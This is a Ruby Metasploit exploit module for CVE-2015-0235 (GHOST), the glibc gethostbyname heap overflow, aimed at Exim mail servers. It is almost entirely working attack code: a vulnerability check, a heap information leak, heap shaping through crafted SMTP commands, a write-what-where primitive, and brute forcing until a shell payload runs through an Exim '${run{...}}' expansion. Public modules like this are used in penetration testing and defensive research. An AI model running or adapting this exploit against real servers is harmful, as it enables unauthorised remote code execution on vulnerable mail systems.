##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit4 < Msf::Exploit::Remote
  Rank = GreatRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'Exim GHOST (glibc gethostbyname) Buffer Overflow',
      'Description' => %q(
        This module remotely exploits CVE-2015-0235 (a.k.a. GHOST, a heap-based
        buffer overflow in the GNU C Library's gethostbyname functions) on x86
        and x86_64 GNU/Linux systems that run the Exim mail server.

        For additional information, please refer to the module's References
        section.
      ),
      'Author' => ['Qualys, Inc. <qsa[at]qualys.com>'],
      'License' => BSD_LICENSE,
      'References' => [
        ['CVE', '2015-0235'],
        ['US-CERT-VU', '967332'],
        ['OSVDB', '117579'],
        ['BID', '72325'],
        ['URL', 'https://www.qualys.com/research/security-advisories/GHOST-CVE-2015-0235.txt'],
        ['URL', 'https://community.qualys.com/blogs/laws-of-vulnerabilities/2015/01/27/the-ghost-vulnerability'],
        ['URL', 'http://r-7.co/1CAnMc0'] # MSF Wiki doc (this module's manual)
      ],
      'DisclosureDate' => 'Jan 27 2015',
      'Privileged' => false, # uid=101(Debian-exim) gid=103(Debian-exim) groups=103(Debian-exim)
      'Platform' => 'unix', # actually 'linux', but we execute a unix-command payload
      'Arch' => ARCH_CMD, # actually [ARCH_X86, ARCH_X86_64], but ^
      'Payload' => {
        'Space' => 255, # the shorter the payload, the higher the probability of code execution
        'BadChars' => "", # we encode the payload ourselves, because ^
        'DisableNops' => true,
        'ActiveTimeout' => 24*60*60 # we may need more than 150 s to execute our bind-shell
      },
      'Targets' => [['Automatic', {}]],
      'DefaultTarget' => 0
    ))

    register_options([
      Opt::RPORT(25),
      OptAddress.new('SENDER_HOST_ADDRESS', [true,
        'The IPv4 address of the SMTP client (Metasploit), as seen by the SMTP server (Exim)', nil])
    ], self.class)

    register_advanced_options([
      OptBool.new('FORCE_EXPLOIT', [false, 'Let the exploit run anyway without the check first', nil])
    ], self.class)
  end

  def check
    # for now, no information about the vulnerable state of the target
    check_code = Exploit::CheckCode::Unknown

    begin
      # not exploiting, just checking
      smtp_connect(false)

      # malloc()ate gethostbyname's buffer, and
      # make sure its next_chunk isn't the top chunk

      9.times do
        smtp_send("HELO ", "", "0", "", "", 1024+16-1+0)
        smtp_recv(HELO_CODES)
      end

      # overflow (4 bytes) gethostbyname's buffer, and
      # overwrite its next_chunk's size field with 0x00303030

      smtp_send("HELO ", "", "0", "", "", 1024+16-1+4)
      # from now on, an exception means vulnerable
      check_code = Exploit::CheckCode::Vulnerable
      # raise an exception if no valid SMTP reply
      reply = smtp_recv(ANY_CODE)
      # can't determine vulnerable state if smtp_verify_helo() isn't called
      return Exploit::CheckCode::Unknown if reply[:code] !~ /#{HELO_CODES}/

      # realloc()ate gethostbyname's buffer, and
      # crash (old glibc) or abort (new glibc)
      # on the overwritten size field

      smtp_send("HELO ", "", "0", "", "", 2048-16-1+4)
      # raise an exception if no valid SMTP reply
      reply = smtp_recv(ANY_CODE)
      # can't determine vulnerable state if smtp_verify_helo() isn't called
      return Exploit::CheckCode::Unknown if reply[:code] !~ /#{HELO_CODES}/
      # a vulnerable target should've crashed by now
      check_code = Exploit::CheckCode::Safe

    rescue
      peer = "#{rhost}:#{rport}"
      vprint_debug("#{peer} - Caught #{$!.class}: #{$!.message}")

    ensure
      smtp_disconnect
    end

    return check_code
  end

  def exploit
    unless datastore['FORCE_EXPLOIT']
      print_status("Checking if target is vulnerable...")
      fail_with("exploit", "Vulnerability check failed.") if check != Exploit::CheckCode::Vulnerable
      print_good("Target is vulnerable.")
    end
    information_leak
    code_execution
  end

  private

  HELO_CODES = '250|451|550'
  ANY_CODE = '[0-9]{3}'

  MIN_HEAP_SHIFT = 80
  MIN_HEAP_SIZE = 128 * 1024
  MAX_HEAP_SIZE = 1024 * 1024

  # Exim
  ALIGNMENT = 8
  STORE_BLOCK_SIZE = 8192
  STOREPOOL_MIN_SIZE = 256

  LOG_BUFFER_SIZE = 8192
  BIG_BUFFER_SIZE = 16384

  SMTP_CMD_BUFFER_SIZE = 16384
  IN_BUFFER_SIZE = 8192

  # GNU C Library
  PREV_INUSE = 0x1
  NS_MAXDNAME = 1025

  # Linux
  MMAP_MIN_ADDR = 65536

  def fail_with(fail_subject, message)
    message = "#{message}. For more info: http://r-7.co/1CAnMc0"
    super(fail_subject, message)
  end

  def information_leak
    print_status("Trying information leak...")
    leaked_arch = nil
    leaked_addr = []

    # try different heap_shift values, in case Exim's heap address contains
    # bad chars (NUL, CR, LF) and was mangled during the information leak;
    # we'll keep the longest one (the least likely to have been truncated)

    16.times do
      done = catch(:another_heap_shift) do
        heap_shift = MIN_HEAP_SHIFT + (rand(1024) & ~15)
        print_debug("#{{ heap_shift: heap_shift }}")

        # write the malloc_chunk header at increasing offsets (8-byte step),
        # until we overwrite the "503 sender not yet given" error message

        128.step(256, 8) do |write_offset|
          error = try_information_leak(heap_shift, write_offset)
          print_debug("#{{ write_offset: write_offset, error: error }}")
          throw(:another_heap_shift) if not error
          next if error == "503 sender not yet given"

          # try a few more offsets (allows us to double-check things,
          # and distinguish between 32-bit and 64-bit machines)

          error = [error]
          1.upto(5) do |i|
            error[i] = try_information_leak(heap_shift, write_offset + i*8)
            throw(:another_heap_shift) if not error[i]
          end
          print_debug("#{{ error: error }}")

          _leaked_arch = leaked_arch
          if (error[0] == error[1]) and (error[0].empty? or (error[0].unpack('C')[0] & 7) == 0) and # fd_nextsize
             (error[2] == error[3]) and (error[2].empty? or (error[2].unpack('C')[0] & 7) == 0) and # fd
             (error[4] =~ /\A503 send[^e].?\z/mn) and ((error[4].unpack('C*')[8] & 15) == PREV_INUSE) and # size
             (error[5] == "177") # the last \x7F of our BAD1 command, encoded as \\177 by string_printing()
            leaked_arch = ARCH_X86_64

          elsif (error[0].empty? or (error[0].unpack('C')[0] & 3) == 0) and # fd_nextsize
                (error[1].empty? or (error[1].unpack('C')[0] & 3) == 0) and # fd
                (error[2] =~ /\A503 [^s].?\z/mn) and ((error[2].unpack('C*')[4] & 7) == PREV_INUSE) and # size
                (error[3] == "177") # the last \x7F of our BAD1 command, encoded as \\177 by string_printing()
            leaked_arch = ARCH_X86

          else
            throw(:another_heap_shift)
          end
          print_debug("#{{ leaked_arch: leaked_arch }}")
          fail_with("infoleak", "arch changed") if _leaked_arch and _leaked_arch != leaked_arch

          # try different large-bins: most of them should be empty,
          # so keep the most frequent fd_nextsize address
          # (a pointer to the malloc_chunk itself)

          count = Hash.new(0)
          0.upto(9) do |last_digit|
            error = try_information_leak(heap_shift, write_offset, last_digit)
            next if not error or error.length < 2 # heap_shift can fix the 2 least significant NUL bytes
            next if (error.unpack('C')[0] & (leaked_arch == ARCH_X86 ? 7 : 15)) != 0 # MALLOC_ALIGN_MASK
            count[error] += 1
          end
          print_debug("#{{ count: count }}")
          throw(:another_heap_shift) if count.empty?

          # convert count to a nested array of [key, value] arrays and sort it
          error_count = count.sort { |a, b| b[1] <=> a[1] }
          error_count = error_count.first # most frequent
          error = error_count[0]
          count = error_count[1]
          throw(:another_heap_shift) unless count >= 6 # majority
          leaked_addr.push({ error: error, shift: heap_shift })

          # common-case shortcut
          if (leaked_arch == ARCH_X86 and error[0,4] == error[4,4] and error[8..-1] == "er not yet given") or
             (leaked_arch == ARCH_X86_64 and error.length == 6 and error[5].count("\x7E-\x7F").nonzero?)
            leaked_addr = [leaked_addr.last] # use this one, and not another
            throw(:another_heap_shift, true) # done
          end
          throw(:another_heap_shift)
        end
        throw(:another_heap_shift)
      end
      break if done
    end

    fail_with("infoleak", "not vuln? old glibc? (no leaked_arch)") if leaked_arch.nil?
    fail_with("infoleak", "NUL, CR, LF in addr? (no leaked_addr)") if leaked_addr.empty?

    leaked_addr.sort! { |a, b| b[:error].length <=> a[:error].length }
    leaked_addr = leaked_addr.first # longest
    error = leaked_addr[:error]
    shift = leaked_addr[:shift]

    leaked_addr = 0
    (leaked_arch == ARCH_X86 ? 4 : 8).times do |i|
      break if i >= error.length
      leaked_addr += error.unpack('C*')[i] * (2**(i*8))
    end
    # leaked_addr should point to the beginning of Exim's smtp_cmd_buffer:
    leaked_addr -= 2*SMTP_CMD_BUFFER_SIZE + IN_BUFFER_SIZE + 4*(11*1024+shift) + 3*1024 + STORE_BLOCK_SIZE
    fail_with("infoleak", "NUL, CR, LF in addr? (no leaked_addr)") if leaked_addr <= MMAP_MIN_ADDR

    print_good("Successfully leaked_arch: #{leaked_arch}")
    print_good("Successfully leaked_addr: #{leaked_addr.to_s(16)}")
    @leaked = { arch: leaked_arch, addr: leaked_addr }
  end

  def try_information_leak(heap_shift, write_offset, last_digit = 9)
    fail_with("infoleak", "heap_shift") if (heap_shift < MIN_HEAP_SHIFT)
    fail_with("infoleak", "heap_shift") if (heap_shift & 15) != 0
    fail_with("infoleak", "write_offset") if (write_offset & 7) != 0
    fail_with("infoleak", "last_digit") if "#{last_digit}" !~ /\A[0-9]\z/

    smtp_connect

    # bulletproof Heap Feng Shui; the hard part is avoiding:
    # "Too many syntax or protocol errors" (3)
    # "Too many unrecognized commands" (3)
    # "Too many nonmail commands" (10)

    smtp_send("HELO ", "", "0", @sender[:hostaddr8], "", 11*1024+13-1 + heap_shift)
    smtp_recv(250)

    smtp_send("HELO ", "", "0", @sender[:hostaddr8], "", 3*1024+13-1)
    smtp_recv(250)

    smtp_send("HELO ", "", "0", @sender[:hostaddr8], "", 3*1024+16+13-1)
    smtp_recv(250)

    smtp_send("HELO ", "", "0", @sender[:hostaddr8], "", 8*1024+16+13-1)
    smtp_recv(250)

    smtp_send("HELO ", "", "0", @sender[:hostaddr8], "", 5*1024+16+13-1)
    smtp_recv(250)

    # overflow (3 bytes) gethostbyname's buffer, and
    # overwrite its next_chunk's size field with 0x003?31
                                                    # ^ last_digit
    smtp_send("HELO ", "", "0", ".1#{last_digit}", "", 12*1024+3-1 + heap_shift-MIN_HEAP_SHIFT)
    begin                       # ^ 0x30 | PREV_INUSE
      smtp_recv(HELO_CODES)

      smtp_send("RSET")
      smtp_recv(250)

      smtp_send("RCPT TO:", "", method(:rand_text_alpha), "\x7F", "", 15*1024)
      smtp_recv(503, 'sender not yet given')

      smtp_send("", "BAD1 ", method(:rand_text_alpha), "\x7F\x7F\x7F\x7F", "", 10*1024-16-1 + write_offset)
      smtp_recv(500, '\A500 unrecognized command\r\n\z')

      smtp_send("BAD2 ", "", method(:rand_text_alpha), "\x7F", "", 15*1024)
      smtp_recv(500, '\A500 unrecognized command\r\n\z')

      smtp_send("DATA")
      reply = smtp_recv(503)

      lines = reply[:lines]
      fail if lines.size <= 3
      fail if lines[+0] != "503-All RCPT commands were rejected with this error:\r\n"
      fail if lines[-2] != "503-valid RCPT command must precede DATA\r\n"
      fail if lines[-1] != "503 Too many syntax or protocol errors\r\n"

      # if leaked_addr contains LF, reverse smtp_respond()'s multiline splitting
      # (the "while (isspace(*msg)) msg++;" loop can't be easily reversed,
      # but happens with lower probability)

      error = lines[+1..-3].join("")
      error.sub!(/\A503-/mn, "")
      error.sub!(/\r\n\z/mn, "")
      error.gsub!(/\r\n503-/mn, "\n")
      return error

    rescue
      return nil
    end

  ensure
    smtp_disconnect
  end

  def code_execution
    print_status("Trying code execution...")

    # can't "${run{/bin/sh -c 'exec /bin/sh -i <&#{b} >&0 2>&0'}} " anymore:
    # DW/26 Set FD_CLOEXEC on SMTP sockets after forking in the daemon, to ensure
    #       that rogue child processes cannot use them.

    fail_with("codeexec", "encoded payload") if payload.raw != payload.encoded
    fail_with("codeexec", "invalid payload") if payload.raw.empty? or payload.raw.count("^\x20-\x7E").nonzero?
    # Exim processes our run-ACL with expand_string() first (hence the [\$\{\}\\] escapes),
    # and transport_set_up_command(), string_dequote() next (hence the [\"\\] escapes).
    encoded = payload.raw.gsub(/[\"\\]/, '\\\\\\&').gsub(/[\$\{\}\\]/, '\\\\\\&')
    # setsid because of Exim's "killpg(pid, SIGKILL);" after "alarm(60);"
    command = '${run{/usr/bin/env setsid /bin/sh -c "' + encoded + '"}}'
    print_debug(command)

    # don't try to execute commands directly, try a very simple ACL first,
    # to distinguish between exploitation-problems and shellcode-problems

    acldrop = "drop message="
    message = rand_text_alpha(command.length - acldrop.length)
    acldrop += message

    max_rand_offset = (@leaked[:arch] == ARCH_X86 ? 32 : 64)
    max_heap_addr = @leaked[:addr]
    min_heap_addr = nil
    survived = nil

    # we later fill log_buffer and big_buffer with alpha chars,
    # which creates a safe-zone at the beginning of the heap,
    # where we can't possibly crash during our brute-force

    # 4, because 3 copies of sender_helo_name, and step_len;
    # start big, but refine little by little in case
    # we crash because we overwrite important data

    helo_len = (LOG_BUFFER_SIZE + BIG_BUFFER_SIZE) / 4
    loop do

      sender_helo_name = "A" * helo_len
      address = sprintf("[%s]:%d", @sender[:hostaddr], 65535)

      # the 3 copies of sender_helo_name, allocated by
      # host_build_sender_fullhost() in POOL_PERM memory

      helo_ip_size = ALIGNMENT +
        sender_helo_name[+1..-2].length

      sender_fullhost_size = ALIGNMENT +
        sprintf("%s (%s) %s", @sender[:hostname], sender_helo_name, address).length

      sender_rcvhost_size = ALIGNMENT + ((@sender[:ident] == nil) ?
        sprintf("%s (%s helo=%s)", @sender[:hostname], address, sender_helo_name) :
        sprintf("%s\n\t(%s helo=%s ident=%s)", @sender[:hostname], address, sender_helo_name, @sender[:ident])
      ).length

      # fit completely into the safe-zone
      step_len = (LOG_BUFFER_SIZE + BIG_BUFFER_SIZE) -
        (max_rand_offset + helo_ip_size + sender_fullhost_size + sender_rcvhost_size)
      loop do

        # inside smtp_cmd_buffer (we later fill smtp_cmd_buffer and smtp_data_buffer
        # with alpha chars, which creates another safe-zone at the end of the heap)
        heap_addr = max_heap_addr
        loop do

          # try harder the first time around: we obtain better
          # heap boundaries, and we usually hit our ACL faster

          (min_heap_addr ? 1 : 2).times do

            # try the same heap_addr several times, but with different random offsets,
            # in case we crash because our hijacked storeblock's length field is too small
            # (we don't control what's stored at heap_addr)

            rand_offset = rand(max_rand_offset)
            print_debug("#{{ helo: helo_len, step: step_len, addr: heap_addr.to_s(16), offset: rand_offset }}")
            reply = try_code_execution(helo_len, acldrop, heap_addr + rand_offset)
            print_debug("#{{ reply: reply }}") if reply

            if reply and
               reply[:code] == "550" and
               # detect the parsed ACL, not the "still in text form" ACL (with "=")
               reply[:lines].join("").delete("^=A-Za-z") =~ /(\A|[^=])#{message}/mn
              print_good("Brute-force SUCCESS")
              print_good("Please wait for reply...")
              # execute command this time, not acldrop
              reply = try_code_execution(helo_len, command, heap_addr + rand_offset)
              print_debug("#{{ reply: reply }}")
              return handler
            end

            if not min_heap_addr
              if reply
                fail_with("codeexec", "no min_heap_addr") if (max_heap_addr - heap_addr) >= MAX_HEAP_SIZE
                survived = heap_addr
              else
                if ((survived ? survived : max_heap_addr) - heap_addr) >= MIN_HEAP_SIZE
                  # survived should point to our safe-zone at the beginning of the heap
                  fail_with("codeexec", "never survived") if not survived
                  print_good "Brute-forced min_heap_addr: #{survived.to_s(16)}"
                  min_heap_addr = survived
                end
              end
            end
          end

          heap_addr -= step_len
          break if min_heap_addr and heap_addr < min_heap_addr
        end

        break if step_len < 1024
        step_len /= 2
      end

      helo_len /= 2
      break if helo_len < 1024
      # ^ otherwise the 3 copies of sender_helo_name will
      # fit into the current_block of POOL_PERM memory
    end
    fail_with("codeexec", "Brute-force FAILURE")
  end

  # our write-what-where primitive
  def try_code_execution(len, what, where)
    fail_with("codeexec", "#{what.length} >= #{len}") if what.length >= len
    fail_with("codeexec", "#{where} < 0") if where < 0

    x86 = (@leaked[:arch] == ARCH_X86)
    min_heap_shift = (x86 ? 512 : 768) # at least request2size(sizeof(FILE))
    heap_shift = min_heap_shift + rand(1024 - min_heap_shift)
    last_digit = 1 + rand(9)

    smtp_connect

    # fill smtp_cmd_buffer, smtp_data_buffer, and big_buffer with alpha chars
    smtp_send("MAIL FROM:", "", method(:rand_text_alpha), "<#{rand_text_alpha_upper(8)}>", "", BIG_BUFFER_SIZE -
             "501 : sender address must contain a domain\r\n\0".length)
    smtp_recv(501, 'sender address must contain a domain')

    smtp_send("RSET")
    smtp_recv(250)

    # bulletproof Heap Feng Shui; the hard part is avoiding:
    # "Too many syntax or protocol errors" (3)
    # "Too many unrecognized commands" (3)
    # "Too many nonmail commands" (10)

    # / 5, because "\x7F" is non-print, and:
    # ss = store_get(length + nonprintcount * 4 + 1);
    smtp_send("BAD1 ", "", "\x7F", "", "", (19*1024 + heap_shift) / 5)
    smtp_recv(500, '\A500 unrecognized command\r\n\z')

    smtp_send("HELO ", "", "0", @sender[:hostaddr8], "", 5*1024+13-1)
    smtp_recv(250)

    smtp_send("HELO ", "", "0", @sender[:hostaddr8], "", 3*1024+13-1)
    smtp_recv(250)

    smtp_send("BAD2 ", "", "\x7F", "", "", (13*1024 + 128) / 5)
    smtp_recv(500, '\A500 unrecognized command\r\n\z')

    smtp_send("HELO ", "", "0", @sender[:hostaddr8], "", 3*1024+16+13-1)
    smtp_recv(250)

    # overflow (3 bytes) gethostbyname's buffer, and
    # overwrite its next_chunk's size field with 0x003?31
                                                    # ^ last_digit
    smtp_send("EHLO ", "", "0", ".1#{last_digit}", "", 5*1024+64+3-1)
    smtp_recv(HELO_CODES)       # ^ 0x30 | PREV_INUSE

    # auth_xtextdecode() is the only way to overwrite the beginning of a
    # current_block of memory (the "storeblock" structure) with arbitrary data
    # (so that our hijacked "next" pointer can contain NUL, CR, LF characters).
    # this shapes the rest of our exploit: we overwrite the beginning of the
    # current_block of POOL_PERM memory with the current_block of POOL_MAIN
    # memory (allocated by auth_xtextdecode()).

    auth_prefix = rand_text_alpha(x86 ? 11264 : 11280)
    (x86 ? 4 : 8).times { |i| auth_prefix += sprintf("+%02x", (where >> (i*8)) & 255) }
    auth_prefix += "."

    # also fill log_buffer with alpha chars
    smtp_send("MAIL FROM:<> AUTH=", auth_prefix, method(:rand_text_alpha), "+", "", 0x3030)
    smtp_recv(501, 'invalid data for AUTH')

    smtp_send("HELO ", "[1:2:3:4:5:6:7:8%eth0:", " ", "#{what}]", "", len)
    begin
      reply = smtp_recv(ANY_CODE)
      return reply if reply[:code] !~ /#{HELO_CODES}/
      return reply if reply[:code] != "250" and reply[:lines].first !~ /argument does not match calling host/

      smtp_send("MAIL FROM:<>")
      reply = smtp_recv(ANY_CODE)
      return reply if reply[:code] != "250"

      smtp_send("RCPT TO:<postmaster>")
      reply = smtp_recv
      return reply

    rescue
      return nil
    end

  ensure
    smtp_disconnect
  end

  DIGITS = '([0-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])'
  DOT = '[.]'

  def smtp_connect(exploiting = true)
    fail_with("smtp_connect", "sock isn't nil") if sock

    connect
    fail_with("smtp_connect", "sock is nil") if not sock
    @smtp_state = :recv

    # Receiving the banner (but we don't really need to check it)
    smtp_recv(220)
    return if not exploiting

    sender_host_address = datastore['SENDER_HOST_ADDRESS']
    if sender_host_address !~ /\A#{DIGITS}#{DOT}#{DIGITS}#{DOT}#{DIGITS}#{DOT}#{DIGITS}\z/
      fail_with("smtp_connect", "bad SENDER_HOST_ADDRESS (nil)") if sender_host_address.nil?
      fail_with("smtp_connect", "bad SENDER_HOST_ADDRESS (not in IPv4 dotted-decimal notation)")
    end
    sender_host_address_octal = "0" + $1.to_i.to_s(8) + ".#{$2}.#{$3}.#{$4}"

    # turn helo_seen on (enable the MAIL command)
    # call smtp_verify_helo() (force fopen() and small malloc()s)
    # call host_find_byname() (force gethostbyname's initial 1024-byte malloc())
    smtp_send("HELO #{sender_host_address_octal}")
    reply = smtp_recv(HELO_CODES)

    if reply[:code] != "250"
      fail_with("smtp_connect", "not Exim?") if reply[:lines].first !~ /argument does not match calling host/
      fail_with("smtp_connect", "bad SENDER_HOST_ADDRESS (helo_verify_hosts)")
    end

    if reply[:lines].first =~ /\A250 (\S*) Hello (.*) \[(\S*)\]\r\n\z/mn
      fail_with("smtp_connect", "bad SENDER_HOST_ADDRESS (helo_try_verify_hosts)") if sender_host_address != $3
      smtp_active_hostname = $1
      sender_host_name = $2

      if sender_host_name =~ /\A(.*) at (\S*)\z/mn
        sender_host_name = $2
        sender_ident = $1
      else
        sender_ident = nil
      end
      fail_with("smtp_connect", "bad SENDER_HOST_ADDRESS (no FCrDNS)") if sender_host_name == sender_host_address_octal

    else
      # can't double-check sender_host_address here, so only for advanced users
      fail_with("smtp_connect", "user-supplied EHLO greeting") unless datastore['FORCE_EXPLOIT']
      # worst-case scenario
      smtp_active_hostname = "A" * NS_MAXDNAME
      sender_host_name = "A" * NS_MAXDNAME
      sender_ident = "A" * 127 * 4 # sender_ident = string_printing(string_copyn(p, 127));
    end

    _sender = @sender
    @sender = {
      hostaddr: sender_host_address,
      hostaddr8: sender_host_address_octal,
      hostname: sender_host_name,
      ident: sender_ident,
      __smtp_active_hostname: smtp_active_hostname
    }
    fail_with("smtp_connect", "sender changed") if _sender and _sender != @sender

    # avoid a future pathological case by forcing it now:
    # "Do NOT free the first successor, if our current block has less than 256 bytes left."
    smtp_send("MAIL FROM:", "<", method(:rand_text_alpha), ">", "", STOREPOOL_MIN_SIZE + 16)
    smtp_recv(501, 'sender address must contain a domain')

    smtp_send("RSET")
    smtp_recv(250, 'Reset OK')
  end

  def smtp_send(prefix, arg_prefix = nil, arg_pattern = nil, arg_suffix = nil, suffix = nil, arg_length = nil)
    fail_with("smtp_send", "state is #{@smtp_state}") if @smtp_state != :send
    @smtp_state = :sending

    if not arg_pattern
      fail_with("smtp_send", "prefix is nil") if not prefix
      fail_with("smtp_send", "param isn't nil") if arg_prefix or arg_suffix or suffix or arg_length
      command = prefix

    else
      fail_with("smtp_send", "param is nil") unless prefix and arg_prefix and arg_suffix and suffix and arg_length
      length = arg_length - arg_prefix.length - arg_suffix.length
      fail_with("smtp_send", "len is #{length}") if length <= 0
      argument = arg_prefix
      case arg_pattern
      when String
        argument += arg_pattern * (length / arg_pattern.length)
        argument += arg_pattern[0, length % arg_pattern.length]
      when Method
        argument += arg_pattern.call(length)
      end
      argument += arg_suffix
      fail_with("smtp_send", "arglen is #{argument.length}, not #{arg_length}") if argument.length != arg_length
      command = prefix + argument + suffix
    end

    fail_with("smtp_send", "invalid char in cmd") if command.count("^\x20-\x7F") > 0
    fail_with("smtp_send", "cmdlen is #{command.length}") if command.length > SMTP_CMD_BUFFER_SIZE
    command += "\n" # RFC says CRLF, but squeeze as many chars as possible in smtp_cmd_buffer

    # the following loop works around a bug in the put() method:
    # "while (send_idx < send_len)" should be "while (send_idx < buf.length)"
    # (or send_idx and/or send_len could be removed altogether, like here)

    while command and not command.empty?
      num_sent = sock.put(command)
      fail_with("smtp_send", "sent is #{num_sent}") if num_sent <= 0
      fail_with("smtp_send", "sent is #{num_sent}, greater than #{command.length}") if num_sent > command.length
      command = command[num_sent..-1]
    end

    @smtp_state = :recv
  end

  def smtp_recv(expected_code = nil, expected_data = nil)
    fail_with("smtp_recv", "state is #{@smtp_state}") if @smtp_state != :recv
    @smtp_state = :recving

    failure = catch(:failure) do

      # parse SMTP replies very carefully (the information
      # leak injects arbitrary data into multiline replies)

      data = ""
      while data !~ /(\A|\r\n)[0-9]{3}[ ].*\r\n\z/mn
        begin
          more_data = sock.get_once
        rescue
          throw(:failure, "Caught #{$!.class}: #{$!.message}")
        end
        throw(:failure, "no more data") if more_data.nil?
        throw(:failure, "no more data") if more_data.empty?
        data += more_data
      end

      throw(:failure, "malformed reply (count)") if data.count("\0") > 0
      lines = data.scan(/(?:\A|\r\n)[0-9]{3}[ -].*?(?=\r\n(?=[0-9]{3}[ -]|\z))/mn)
      throw(:failure, "malformed reply (empty)") if lines.empty?

      code = nil
      lines.size.times do |i|
        lines[i].sub!(/\A\r\n/mn, "")
        lines[i] += "\r\n"

        if i == 0
          code = lines[i][0,3]
          throw(:failure, "bad code") if code !~ /\A[0-9]{3}\z/mn
          if expected_code and code !~ /\A(#{expected_code})\z/mn
            throw(:failure, "unexpected #{code}, expected #{expected_code}")
          end
        end

        line_begins_with = lines[i][0,4]
        line_should_begin_with = code + (i == lines.size-1 ? " " : "-")

        if line_begins_with != line_should_begin_with
          throw(:failure, "line begins with #{line_begins_with}, " \
                          "should begin with #{line_should_begin_with}")
        end
      end

      throw(:failure, "malformed reply (join)") if lines.join("") != data
      if expected_data and data !~ /#{expected_data}/mn
        throw(:failure, "unexpected data")
      end

      reply = { code: code, lines: lines }
      @smtp_state = :send
      return reply
    end

    fail_with("smtp_recv", "#{failure}") if expected_code
    return nil
  end

  def smtp_disconnect
    disconnect if sock
    fail_with("smtp_disconnect", "sock isn't nil") if sock
    @smtp_state = :disconnected
  end
end
